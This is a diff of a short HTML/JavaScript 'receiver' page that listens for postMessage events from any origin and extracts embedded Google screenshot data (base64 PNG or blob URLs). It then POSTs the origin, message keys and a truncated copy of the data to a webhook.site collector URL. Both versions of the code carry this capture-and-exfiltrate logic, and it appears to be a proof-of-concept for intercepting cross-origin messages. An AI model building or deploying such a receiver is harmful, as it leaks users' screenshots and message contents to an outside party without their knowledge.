@@ -1,52 +1,45 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <h3>Receiver Loaded</h3>
-    <script>
-      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322"; // Replace if needed
+<script>
+  const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322"; // Replace if needed
 
-      function deepFindScreenshot(obj) {
-        const str = JSON.stringify(obj);
-        const base64 = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
-        const blob = str.match(/blob:https:\/\/www\.google\.com\/[a-z0-9\-]+/i);
-        return base64 ? base64[0] : (blob ? blob[0] : null);
+  function deepFindScreenshot(obj) {
+    const str = JSON.stringify(obj);
+    const base64 = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
+    const blob = str.match(/blob:https:\/\/www\.google\.com\/[a-z0-9\-]+/i);
+    return base64 ? base64[0] : (blob ? blob[0] : null);
+  }
+
+  window.addEventListener("message", (e) => {
+    try {
+      const origin = e.origin;
+      const data = e.data;
+      const keys = Object.keys(data || {});
+      const screenshot = deepFindScreenshot(data);
+
+      console.log("📩 Message from:", origin);
+      console.log("📦 Keys:", keys);
+      console.log("🖼 Screenshot found:", !!screenshot);
+      if (screenshot) {
+        const img = new Image();
+        img.src = screenshot;
+        img.style = "max-width:100%;border:2px solid red";
+        document.body.appendChild(img);
       }
 
-      window.addEventListener("message", (e) => {
-        try {
-          const origin = e.origin;
-          const data = e.data;
-          const keys = Object.keys(data || {});
-          const screenshot = deepFindScreenshot(data);
-
-          console.log("📩 Message received from:", origin);
-          console.log("🧩 Keys:", keys);
-          console.log("🖼 Screenshot found?", !!screenshot, screenshot);
-
-          if (screenshot) {
-            const img = document.createElement("img");
-            img.src = screenshot;
-            img.style = "max-width:100%;border:2px solid red";
-            document.body.appendChild(img);
-          }
-
-          fetch(webhookURL, {
-            method: "POST",
-            mode: "no-cors",
-            body: JSON.stringify({
-              origin,
-              keys,
-              containsScreenshot: !!screenshot,
-              truncated: JSON.stringify(data).slice(0, 1000),
-              timestamp: new Date().toISOString()
-            })
-          });
-        } catch (err) {
-          console.error("❌ Error handling postMessage:", err);
-        }
+      fetch(webhookURL, {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify({
+          origin,
+          keys,
+          containsScreenshot: !!screenshot,
+          truncated: JSON.stringify(data).slice(0, 1000),
+          timestamp: new Date().toISOString()
+        })
       });
+    } catch (err) {
+      console.error("Error in message handler:", err);
+    }
+  });
 
-      console.log("✅ Receiver ready");
-    </script>
-  </body>
-</html>
+  console.log("✅ Receiver listening for multiple messages");
+</script>
